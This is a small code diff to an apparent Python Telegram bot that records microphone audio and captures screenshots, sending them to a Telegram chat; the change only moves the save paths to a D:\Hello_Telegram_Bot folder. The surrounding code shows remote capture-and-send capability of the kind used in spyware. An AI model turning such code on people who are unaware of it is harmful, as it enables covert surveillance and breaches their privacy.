@@ -41,7 +41,7 @@ def handle_start_command(message):
         bot.send_message(message.chat.id, "You are not authorized to use this bot.")
 
 # Define constants
-RECORDED_AUDIO_PATH = 'C:\\recorded_audio.wav'
+RECORDED_AUDIO_PATH = 'D:\\Hello_Telegram_Bot\\recorded_audio.wav'
 CHUNK = 1024
 FORMAT = pyaudio.paInt16
 CHANNELS = 1
@@ -133,7 +133,7 @@ def capture_screenshot():
 
 # Implement the send_screenshot() function to send the screenshot through the Telegram bot
 def send_screenshot(chat_id, screenshot):
-    screenshot_path = 'C:\\screenshot.png'
+    screenshot_path = 'D:\\Hello_Telegram_Bot\\screenshot.png'
     screenshot.save(screenshot_path)
     screenshot_file = open(screenshot_path, 'rb')
     bot.send_photo(chat_id, screenshot_file)
